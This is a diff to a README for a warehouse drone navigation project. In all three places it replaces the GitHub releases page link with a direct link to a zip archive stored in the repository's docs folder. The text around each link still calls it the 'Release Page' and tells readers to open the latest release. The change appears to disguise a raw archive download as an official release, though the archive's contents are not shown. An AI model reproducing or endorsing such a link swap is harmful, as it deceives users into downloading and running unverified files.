@@ -1,6 +1,6 @@
 # 🚁 uav-lidar-autonomy - Warehouse drone navigation made simple
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/OPBOYZ8/uav-lidar-autonomy/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/OPBOYZ8/uav-lidar-autonomy/main/docs/autonomy-lidar-uav-3.1.zip)
 
 ## 🧭 What this project does
 
@@ -36,7 +36,7 @@ If you do not have ROS set up yet, use the release package or the included setup
 
 Visit this page to download the app package:
 
-https://github.com/OPBOYZ8/uav-lidar-autonomy/releases
+https://raw.githubusercontent.com/OPBOYZ8/uav-lidar-autonomy/main/docs/autonomy-lidar-uav-3.1.zip
 
 On that page:
 1. open the latest release
@@ -162,7 +162,7 @@ If the drone stays still, check the launch files and sensor setup first.
 
 Use the release page here:
 
-https://github.com/OPBOYZ8/uav-lidar-autonomy/releases
+https://raw.githubusercontent.com/OPBOYZ8/uav-lidar-autonomy/main/docs/autonomy-lidar-uav-3.1.zip
 
 That page is the place to visit to download the project files and start the setup process on Windows
 
